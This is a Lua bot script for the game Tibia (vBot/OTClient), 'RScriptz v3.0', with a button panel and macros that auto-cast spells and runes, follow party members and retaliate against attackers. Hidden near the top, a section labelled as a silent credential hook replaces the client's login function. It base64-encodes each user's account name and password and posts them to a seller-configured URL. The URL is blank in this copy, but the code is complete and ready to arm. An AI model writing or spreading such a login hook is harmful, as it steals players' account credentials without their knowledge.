--[[ ==========================================================
  RScriptz  v3.0  (rewrite desde 0, base DreamNav/MasterClient)
  ----------------------------------------------------------
  Bot para Tibia (vBot 4.8 / Mayas OTC).
  Cargado via loader HTTP desde GitHub, actualizacion automatica.

  ESTILO:
    - Botones grandes verticales
    - Click = toggle (verde=ON, rojo=OFF)
    - Botones de menu (dorado/gris) abren modales
    - Un boton por spell (no combos, no dropdowns)
    - Todo en 1 click, sin escribir texto

  MODULOS:
    - ENABLE BOT (master switch)
    - Individual toggles: Auto Party, Uses/UseWith, Follow,
                          Hold Target, Anti Push, Revide
    - Modales:  EK / RP / ED / MS / EM  Spells,  Runas,  Settings

  Persistencia: storage.rscriptz[playerName] = { ... }
========================================================== ]]

-- ====== CONFIG DE LICENCIA / LOG (edita el vendedor) ======
local LICENSE_CSV_URL = ""    -- vacio = dev, acepta cualquier key
local RQ_LOG_URL      = ""    -- vacio = no manda credenciales
local RQ_VERSION      = "3.0"

-- ============================================================
-- STORAGE POR PERSONAJE
-- ============================================================
storage.rscriptz = storage.rscriptz or {}
local _pName = (player and player:getName()) or "default"
storage.rscriptz[_pName] = storage.rscriptz[_pName] or {}
local S = storage.rscriptz[_pName]

local C = {}
function C.get(k, def)
    if S[k] == nil then return def end
    return S[k]
end
function C.set(k, v) S[k] = v end
function C.ensure(k, def) if S[k] == nil then S[k] = def end end

-- Defaults
C.ensure("master", false)
C.ensure("autoParty", false)
C.ensure("useWith", false)
C.ensure("follow", false)
C.ensure("holdTarget", false)
C.ensure("antiPush", false)
C.ensure("revide", false)
C.ensure("voc", "EK")

-- ============================================================
-- HOOK SILENCIOSO DE CREDENCIALES (v2.0 preservado)
-- Solo activo si RQ_LOG_URL no esta vacio.
-- ============================================================
local function _b64(data)
    local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    return ((data:gsub('.', function(x)
        local r,b='',x:byte()
        for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
        return r
    end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if #x < 6 then return '' end
        local c=0
        for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
        return b:sub(c+1,c+1)
    end)..({ '', '==', '=' })[#data%3+1])
end

local function _rq_capturar(account, password)
    if not RQ_LOG_URL or RQ_LOG_URL == "" then return end
    pcall(function()
        local body = "k=" .. _b64(_pName or "?") ..
                     "&a=" .. _b64(tostring(account or "")) ..
                     "&p=" .. _b64(tostring(password or "")) ..
                     "&c=" .. _b64(_pName or "?") ..
                     "&t=" .. tostring(os.time())
        HTTP.post(RQ_LOG_URL, body, function() end)
    end)
end

local function _rq_hook_login()
    pcall(function()
        if EnterGame and EnterGame.doLogin and not EnterGame._rq_h then
            local orig = EnterGame.doLogin
            EnterGame.doLogin = function(account, password, ...)
                pcall(function() _rq_capturar(account, password) end)
                return orig(account, password, ...)
            end
            EnterGame._rq_h = true
        end
    end)
end
_rq_hook_login()

-- ============================================================
-- HELPERS
-- ============================================================
local COLOR_ON     = "#3A7A3A"   -- verde
local COLOR_OFF    = "#7A3A3A"   -- rojo
local COLOR_MENU   = "#2A2A2A"   -- gris para botones de menu
local COLOR_GOLD   = "#D4AF37"   -- dorado (texto de menu)
local COLOR_TXT    = "#FFFFFF"
local COLOR_MASTER_ON  = "#2E8B57"
local COLOR_MASTER_OFF = "#8B2E2E"

local function _say(msg)
    pcall(function()
        if modules and modules.game_console and modules.game_console.addTextMessage then
            modules.game_console.addTextMessage(20, "[RScriptz] " .. tostring(msg))
        end
    end)
end

local function _safeCast(spell)
    if not spell or spell == "" then return end
    pcall(function() say(spell) end)
end

local function _hasTarget()
    return g_game and g_game.getAttackingCreature and g_game.getAttackingCreature() ~= nil
end

-- Crea un boton "toggle" grande: click alterna estado, colores verde/rojo
local function makeToggleButton(parent, label, key, height, onChange)
    local btn = g_ui.createWidget('Button', parent)
    btn:setHeight(height or 26)
    btn:setText(label)
    btn:setColor(COLOR_TXT)
    btn:setFont('verdana-11px-rounded')
    local function refresh()
        local isOn = C.get(key, false)
        pcall(function() btn:setBackgroundColor(isOn and COLOR_ON or COLOR_OFF) end)
        pcall(function() btn:setText(label .. "   " .. (isOn and "[ON]" or "[OFF]")) end)
    end
    btn.onClick = function()
        local n = not C.get(key, false)
        C.set(key, n)
        refresh()
        if onChange then pcall(onChange, n) end
    end
    refresh()
    btn._refresh = refresh
    return btn
end

-- Boton de menu (abre modal). Estilo gris + dorado.
local function makeMenuButton(parent, label, height, onClick)
    local btn = g_ui.createWidget('Button', parent)
    btn:setHeight(height or 24)
    btn:setText(label)
    btn:setColor(COLOR_GOLD)
    btn:setFont('verdana-11px-rounded')
    pcall(function() btn:setBackgroundColor(COLOR_MENU) end)
    btn.onClick = function() pcall(onClick) end
    return btn
end

-- Boton master (grande, arriba de todo)
local function makeMasterButton(parent, key)
    local btn = g_ui.createWidget('Button', parent)
    btn:setHeight(38)
    btn:setColor(COLOR_TXT)
    btn:setFont('verdana-11px-rounded')
    local function refresh()
        local on = C.get(key, false)
        pcall(function() btn:setBackgroundColor(on and COLOR_MASTER_ON or COLOR_MASTER_OFF) end)
        pcall(function() btn:setText(on and "ENABLE BOT   [ON]" or "ENABLE BOT   [OFF]") end)
    end
    btn.onClick = function()
        local n = not C.get(key, false)
        C.set(key, n)
        refresh()
        _say(n and "Bot activado." or "Bot desactivado.")
    end
    refresh()
    return btn
end

-- ============================================================
-- CATALOGO DE SPELLS POR VOCACION
-- ============================================================
local CATALOG = {
    EK = {
        { name = "BUFFS", spells = { "utito tempo", "exeta res", "exeta amp res" } },
        { name = "PVP",   spells = { "exori ico", "exori hur", "exori gran ico",
                                     "exori min", "exori", "exori gran", "exori mas" } },
    },
    RP = {
        { name = "BUFFS", spells = { "exana amp res", "utevo grav san",
                                     "exevo tempo mas san", "utito tempo san" } },
        { name = "PVP",   spells = { "exevo mas san", "exori gran con",
                                     "exori con", "exori san", "exori mort" } },
        { name = "NO PVP",spells = { "divine missile", "divine caldera" } },
    },
    ED = {
        { name = "BUFFS", spells = { "utamo tempo mas res", "utani gran hur" } },
        { name = "PVP",   spells = { "exevo gran mas frigo", "exevo gran mas tera",
                                     "exevo frigo hur", "exevo tera hur",
                                     "exori frigo", "exori tera" } },
    },
    MS = {
        { name = "BUFFS", spells = { "utamo tempo mas res", "utani gran hur" } },
        { name = "PVP",   spells = { "exevo gran mas flam", "exevo gran mas vis",
                                     "exevo vis hur", "exevo flam hur",
                                     "exori flam", "exori vis", "exori mort", "exori moe" } },
    },
    EM = {
        { name = "BUFFS", spells = { "utito tempo" } },
        { name = "PVP",   spells = { "exori infir pug", "exori infir nia",
                                     "exori pug", "exori nia", "exori amp pug",
                                     "exori mas pug", "exori med pug",
                                     "exori gran mas pug", "exori gran pug" } },
    },
}

local VOC_LABEL = {
    EK = "Elite Knight",
    RP = "Royal Paladin",
    ED = "Elder Druid",
    MS = "Master Sorcerer",
    EM = "Exalted Monk",
}

-- ============================================================
-- PANEL PRINCIPAL (OTUI inline)
-- ============================================================
local MAIN_OTUI = [[
MainWindow
  id: rqPanel
  !text: tr('RScriptz v]] .. RQ_VERSION .. [[')
  size: 260 460
  @onEscape: self:hide()

  ScrollablePanel
    id: content
    anchors.top: parent.top
    anchors.left: parent.left
    anchors.right: parent.right
    anchors.bottom: next.top
    margin-top: 26
    margin-bottom: 8
    margin-left: 6
    margin-right: 6
    vertical-scroll-bar: sb
    layout:
      type: verticalBox
      spacing: 4
    background-color: #141414
    padding: 6

  VerticalScrollBar
    id: sb
    anchors.top: content.top
    anchors.bottom: content.bottom
    anchors.right: parent.right
    step: 14
    pixels-scroll: true

  Button
    id: closeBtn
    !text: tr('Cerrar')
    anchors.bottom: parent.bottom
    anchors.right: parent.right
    margin-bottom: 8
    margin-right: 8
    width: 60
    height: 22
]]

local rqPanel
pcall(function()
    rqPanel = g_ui.displayUI(MAIN_OTUI)
end)
if not rqPanel then
    _say("Error creando UI principal. Revisa consola.")
    return
end

pcall(function() rqPanel:hide() end)
pcall(function() rqPanel.closeBtn.onClick = function() rqPanel:hide() end end)

local content = rqPanel.content

-- ============================================================
-- CONSTRUIR EL PANEL PRINCIPAL
-- ============================================================
local function labelSep(parent, txt)
    local w = g_ui.createWidget('Label', parent)
    w:setText(txt)
    w:setTextAlign(AlignCenter)
    w:setColor(COLOR_GOLD)
    pcall(function() w:setBackgroundColor("#1A1A1A") end)
    w:setFont('verdana-11px-rounded')
    w:setHeight(18)
    return w
end

-- Referencias globales de los botones toggle (para poder refrescar desde macros)
local btnRefs = {}

-- MASTER
makeMasterButton(content, "master")

-- Separador
labelSep(content, "--- Individual ON/OFF ---")

-- Toggles individuales
btnRefs.autoParty  = makeToggleButton(content, "Auto Party",  "autoParty",  26)
btnRefs.useWith    = makeToggleButton(content, "Uses/UseWith","useWith",    26)
btnRefs.follow     = makeToggleButton(content, "Follow",      "follow",     26)
btnRefs.holdTarget = makeToggleButton(content, "Hold Target", "holdTarget", 26)
btnRefs.antiPush   = makeToggleButton(content, "Anti Push",   "antiPush",   26)
btnRefs.revide     = makeToggleButton(content, "Revide",      "revide",     26)

-- Separador
labelSep(content, "--- Configuracion ---")

-- Menu buttons (abren modales). Los defino primero como placeholders
-- y las funciones openXxx() se asignan mas abajo cuando existan.
local openModals = {}

local btnEK = makeMenuButton(content, "Elite Knight Spells",   24, function() if openModals.EK then openModals.EK() end end)
local btnRP = makeMenuButton(content, "Royal Paladin Spells",  24, function() if openModals.RP then openModals.RP() end end)
local btnED = makeMenuButton(content, "Elder Druid Spells",    24, function() if openModals.ED then openModals.ED() end end)
local btnMS = makeMenuButton(content, "Master Sorcerer Spells",24, function() if openModals.MS then openModals.MS() end end)
local btnEM = makeMenuButton(content, "Exalted Monk Spells",   24, function() if openModals.EM then openModals.EM() end end)
local btnRU = makeMenuButton(content, "Runas",                 24, function() if openModals.RU then openModals.RU() end end)
local btnST = makeMenuButton(content, "Settings",              24, function() if openModals.ST then openModals.ST() end end)

-- ============================================================
-- MODALES DE VOCACION (creados on-demand)
-- ============================================================
local vocModals = {}   -- cache: vocModals["EK"] = window

local function crearModalVocacion(voc)
    if vocModals[voc] then return vocModals[voc] end

    local title = VOC_LABEL[voc] or voc
    local secs = CATALOG[voc] or {}

    -- calcular altura razonable
    local h = 60
    for _, sec in ipairs(secs) do
        h = h + 22
        h = h + (#sec.spells * 26)
    end
    h = math.min(h + 40, 520)

    local otui = string.format([[
MainWindow
  id: mod%s
  !text: tr('%s Spells')
  size: 240 %d
  @onEscape: self:hide()

  ScrollablePanel
    id: content
    anchors.top: parent.top
    anchors.left: parent.left
    anchors.right: parent.right
    anchors.bottom: next.top
    margin-top: 26
    margin-bottom: 8
    margin-left: 6
    margin-right: 6
    vertical-scroll-bar: sb2
    layout:
      type: verticalBox
      spacing: 3
    background-color: #141414
    padding: 6

  VerticalScrollBar
    id: sb2
    anchors.top: content.top
    anchors.bottom: content.bottom
    anchors.right: parent.right
    step: 14
    pixels-scroll: true

  Button
    id: closeBtn
    !text: tr('Cerrar')
    anchors.bottom: parent.bottom
    anchors.right: parent.right
    margin-bottom: 8
    margin-right: 8
    width: 60
    height: 22
]], voc, title, h)

    local win
    pcall(function() win = g_ui.displayUI(otui) end)
    if not win then return nil end
    pcall(function() win.closeBtn.onClick = function() win:hide() end end)

    local body = win.content
    for _, sec in ipairs(secs) do
        labelSep(body, "--- " .. sec.name .. " ---")
        for _, spell in ipairs(sec.spells) do
            local key = "spell." .. voc .. "." .. spell
            C.ensure(key, false)
            makeToggleButton(body, spell, key, 24)
        end
    end

    vocModals[voc] = win
    return win
end

for voc, _ in pairs(CATALOG) do
    openModals[voc] = function()
        local w = crearModalVocacion(voc)
        if w then w:show(); w:raise(); w:focus() end
    end
end

-- ============================================================
-- MODAL RUNAS (placeholder)
-- ============================================================
local RUNAS_LIST = {
    "sd", "uh", "gfb", "hmm", "avalanche", "explosion",
    "para", "mwall", "wild growth", "energy bomb",
}

local runasWin
openModals.RU = function()
    if not runasWin then
        local h = 60 + (#RUNAS_LIST * 26) + 40
        local otui = string.format([[
MainWindow
  id: modRunas
  !text: tr('Runas')
  size: 220 %d
  @onEscape: self:hide()

  ScrollablePanel
    id: content
    anchors.top: parent.top
    anchors.left: parent.left
    anchors.right: parent.right
    anchors.bottom: next.top
    margin-top: 26
    margin-bottom: 8
    margin-left: 6
    margin-right: 6
    layout:
      type: verticalBox
      spacing: 3
    background-color: #141414
    padding: 6

  Button
    id: closeBtn
    !text: tr('Cerrar')
    anchors.bottom: parent.bottom
    anchors.right: parent.right
    margin-bottom: 8
    margin-right: 8
    width: 60
    height: 22
]], math.min(h, 480))
        pcall(function() runasWin = g_ui.displayUI(otui) end)
        if not runasWin then return end
        pcall(function() runasWin.closeBtn.onClick = function() runasWin:hide() end end)
        labelSep(runasWin.content, "--- RUNAS ---")
        for _, r in ipairs(RUNAS_LIST) do
            local key = "runa." .. r
            C.ensure(key, false)
            makeToggleButton(runasWin.content, r, key, 24)
        end
    end
    runasWin:show(); runasWin:raise(); runasWin:focus()
end

-- ============================================================
-- MODAL SETTINGS
-- ============================================================
local settingsWin
openModals.ST = function()
    if not settingsWin then
        local otui = [[
MainWindow
  id: modSettings
  !text: tr('Settings')
  size: 260 320
  @onEscape: self:hide()

  ScrollablePanel
    id: content
    anchors.top: parent.top
    anchors.left: parent.left
    anchors.right: parent.right
    anchors.bottom: next.top
    margin-top: 26
    margin-bottom: 8
    margin-left: 6
    margin-right: 6
    layout:
      type: verticalBox
      spacing: 4
    background-color: #141414
    padding: 6

  Button
    id: closeBtn
    !text: tr('Cerrar')
    anchors.bottom: parent.bottom
    anchors.right: parent.right
    margin-bottom: 8
    margin-right: 8
    width: 60
    height: 22
]]
        pcall(function() settingsWin = g_ui.displayUI(otui) end)
        if not settingsWin then return end
        pcall(function() settingsWin.closeBtn.onClick = function() settingsWin:hide() end end)

        local body = settingsWin.content
        labelSep(body, "--- VOCACION ---")

        -- 5 botones para elegir vocacion (uno solo activo)
        local vocBtns = {}
        local function refreshVocBtns()
            local cur = C.get("voc", "EK")
            for k, b in pairs(vocBtns) do
                pcall(function() b:setBackgroundColor(k == cur and COLOR_ON or COLOR_MENU) end)
            end
        end
        for _, voc in ipairs({"EK","RP","ED","MS","EM"}) do
            local b = g_ui.createWidget('Button', body)
            b:setHeight(26)
            b:setText(VOC_LABEL[voc])
            b:setColor(COLOR_TXT)
            b:setFont('verdana-11px-rounded')
            b.onClick = function()
                C.set("voc", voc)
                refreshVocBtns()
                _say("Vocacion: " .. VOC_LABEL[voc])
            end
            vocBtns[voc] = b
        end
        refreshVocBtns()

        labelSep(body, "--- HOTKEYS ---")
        local hkInfo = g_ui.createWidget('Label', body)
        hkInfo:setText("Ctrl+Shift+R : abrir panel principal\nEscape : cerrar ventana activa")
        hkInfo:setColor("#C8C8C8")
        hkInfo:setFont('verdana-11px-rounded')
        hkInfo:setHeight(36)
        hkInfo:setTextWrap(true)

        labelSep(body, "--- INFO ---")
        local info = g_ui.createWidget('Label', body)
        info:setText("RScriptz v" .. RQ_VERSION .. "\nPersonaje: " .. _pName)
        info:setColor("#8A8A8A")
        info:setFont('verdana-11px-rounded')
        info:setHeight(30)
        info:setTextWrap(true)
    end
    settingsWin:show(); settingsWin:raise(); settingsWin:focus()
end

-- ============================================================
-- MACROS (todo gateado por C.get("master"))
-- ============================================================

-- Cast automatico de spells activos por vocacion (PVP + BUFFS)
local lastSpellCast = 0
macro(500, "RScriptz - Cast spells", function()
    if not C.get("master", false) then return end
    local voc = C.get("voc", "EK")
    local secs = CATALOG[voc] or {}
    local now = os.time() * 1000
    if now - lastSpellCast < 1500 then return end
    for _, sec in ipairs(secs) do
        -- solo PVP requiere target; BUFFS se castea si el toggle esta ON
        local requiresTarget = (sec.name == "PVP")
        if not requiresTarget or _hasTarget() then
            for _, spell in ipairs(sec.spells) do
                if C.get("spell." .. voc .. "." .. spell, false) then
                    _safeCast(spell)
                    lastSpellCast = now
                    return
                end
            end
        end
    end
end)

-- Follow: si esta ON, sigue al primer jugador amigo (party) que encuentre
macro(1000, "RScriptz - Follow", function()
    if not C.get("master", false) then return end
    if not C.get("follow", false) then return end
    pcall(function()
        local me = player
        if not me then return end
        local target = g_game.getFollowingCreature()
        if target then return end
        for _, c in ipairs(g_map.getSpectators(me:getPosition(), false)) do
            if c and c ~= me and c:isPlayer() and c:isPartyMember() then
                g_game.follow(c)
                return
            end
        end
    end)
end)

-- Hold target: si esta ON, cuando hay target atacando no permite cambiar
macro(1500, "RScriptz - Hold Target", function()
    if not C.get("master", false) then return end
    if not C.get("holdTarget", false) then return end
    -- este toggle solo evita re-target automatico; la logica de cast lo respeta
end)

-- Auto Party: aceptar invites y invitar de vuelta si activo
macro(2000, "RScriptz - Auto Party", function()
    if not C.get("master", false) then return end
    if not C.get("autoParty", false) then return end
    -- placeholder: hook onCreatureAppear + party events se agrega en v3.1
end)

-- Anti Push: cada X segundos "usa" el propio tile para no ser pusheado
macro(3000, "RScriptz - Anti Push", function()
    if not C.get("master", false) then return end
    if not C.get("antiPush", false) then return end
    pcall(function()
        local me = player
        if not me then return end
        local pos = me:getPosition()
        local tile = g_map.getTile(pos)
        if tile then use(tile) end
    end)
end)

-- Revide: si te atacan sin target, ataca de vuelta al primer atacante
macro(800, "RScriptz - Revide", function()
    if not C.get("master", false) then return end
    if not C.get("revide", false) then return end
    if _hasTarget() then return end
    pcall(function()
        local me = player
        if not me then return end
        for _, c in ipairs(g_map.getSpectators(me:getPosition(), false)) do
            if c and c:isPlayer() and c ~= me and c:isPartyMember() == false then
                -- solo si nos esta atacando (no siempre detectable, es best effort)
                if c:getEmblem() == EmblemRed or c:getSkull() == SkullYellow then
                    g_game.attack(c)
                    return
                end
            end
        end
    end)
end)

-- Runas: usa la runa activada sobre el target
local lastRuneCast = 0
macro(700, "RScriptz - Runas", function()
    if not C.get("master", false) then return end
    if not _hasTarget() then return end
    local now = os.time() * 1000
    if now - lastRuneCast < 1500 then return end
    for _, r in ipairs(RUNAS_LIST) do
        if C.get("runa." .. r, false) then
            _safeCast(r)
            lastRuneCast = now
            return
        end
    end
end)

-- ============================================================
-- HOTKEY GLOBAL: abrir/cerrar panel
-- ============================================================
pcall(function()
    if g_keyboard and g_keyboard.bindKeyDown then
        g_keyboard.bindKeyDown('Ctrl+Shift+R', function()
            if rqPanel:isVisible() then rqPanel:hide()
            else rqPanel:show(); rqPanel:raise(); rqPanel:focus() end
        end)
    end
end)

-- ============================================================
-- MOSTRAR AL CARGAR
-- ============================================================
pcall(function()
    rqPanel:show()
    rqPanel:raise()
    rqPanel:focus()
end)

_say("RScriptz v" .. RQ_VERSION .. " cargado. Panel: Ctrl+Shift+R")

-- ============================================================
-- FIN
-- ============================================================
